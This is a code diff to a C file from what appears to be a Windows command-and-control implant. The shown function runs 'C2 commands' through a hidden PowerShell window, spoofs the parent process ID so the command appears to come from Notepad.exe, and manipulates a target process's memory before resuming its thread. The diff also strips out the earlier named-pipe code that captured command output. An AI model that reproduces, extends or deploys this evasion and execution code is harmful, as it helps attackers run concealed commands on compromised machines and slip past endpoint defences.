@@ -1,10 +1,5 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <windows.h>
-#include <wininet.h>
-#include <winternl.h>
-#include <tlhelp32.h>
 
+#include "..\helper.h"
 #include "ExecutePowershell.h"
 
 BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN SIZE_T dwBufferSize) {
@@ -40,7 +35,7 @@ BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVO
     return TRUE;
 }
 
-LPSTR ExecPowerShell(LPCWSTR psCommand) {
+VOID ExecPowerShell(LPCWSTR psCommand) {
     STARTUPINFOEXW SiEx = { 0 };
     SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXW);
 	PROCESS_INFORMATION Pi = { 0 };
@@ -48,26 +43,9 @@ LPSTR ExecPowerShell(LPCWSTR psCommand) {
 
     printf("[*] Executing C2 command : %ls\n", psCommand);
 
-/*    
-    WCHAR pipeName[128];
-    wsprintfW(pipeName, L"\\\\.\\pipe\\rzdhop_npipe_%lu", GetTickCount());
-    printf("[*] Creating Named Pipe : '%ls'\n", pipeName);
-*/
-    //HANDLE hPipe = CreateNamedPipeW(pipeName, PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 4096, 4096, 0, NULL);
     wsprintfW(
         wrappedPsCmd,
-        L"powershell.exe -NoProfile -WindowStyle Hidden -Command "
-        L"\""
-        L"`$o = (& { %ls } | Out-String); ",
-        //L"`$pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.', '%ls', [System.IO.Pipes.PipeDirection]::Out); " 
-        //L"`$pipe.Connect(); " //Connect to named pipe
-        //L"`$b = [System.Text.Encoding]::UTF8.GetBytes(`$o); "
-        //L"`$pipe.Write(`$b,0,`$b.Length); " //write in named pipe
-        //L"`$pipe.Flush(); "
-        //L"`$pipe.Close()"
-        //L"\"",
-        psCommand
-        //pipeName + 9 // saute "\\.\pipe\"
+        L"powershell.exe -NoProfile -WindowStyle Hidden -Command \" %ls \"",psCommand
     );
 
     printf("[*] Spoofing PPID of Notepad.exe\n");
@@ -137,23 +115,9 @@ LPSTR ExecPowerShell(LPCWSTR psCommand) {
     printf("[*] Process manipulation done, resuming thread...\n");
     ResumeThread(Pi.hThread);
     Sleep(2);
-    //ConnectNamedPipe(hPipe, NULL);
-
-    //CHAR pipeChunkBuffer[4096];
-    //DWORD bytesRead = 0;
-    //SIZE_T outputSize = 0;
     LPSTR outputBuffer = calloc(1, 1); //will be reallocated at each bytes read
-//
-    //while (ReadFile(hPipe, pipeChunkBuffer, sizeof(pipeChunkBuffer) - 1, &bytesRead, NULL) && bytesRead) {
-    //    pipeChunkBuffer[bytesRead] = 0;
-    //    outputBuffer = realloc(outputBuffer, outputSize + bytesRead + 1);
-    //    memcpy(outputBuffer + outputSize, pipeChunkBuffer, bytesRead);
-    //    outputSize += bytesRead;
-    //}
-    WaitForSingleObject(Pi.hProcess, INFINITE);
 
-    //DisconnectNamedPipe(hPipe);
-    //CloseHandle(hPipe);
+    WaitForSingleObject(Pi.hProcess, INFINITE);
     
     CloseHandle(Pi.hThread);
     CloseHandle(Pi.hProcess);
@@ -163,6 +127,4 @@ LPSTR ExecPowerShell(LPCWSTR psCommand) {
     
     DeleteProcThreadAttributeList(pThreadAttList);
     free(pThreadAttList);
-    
-    return outputBuffer;
 }
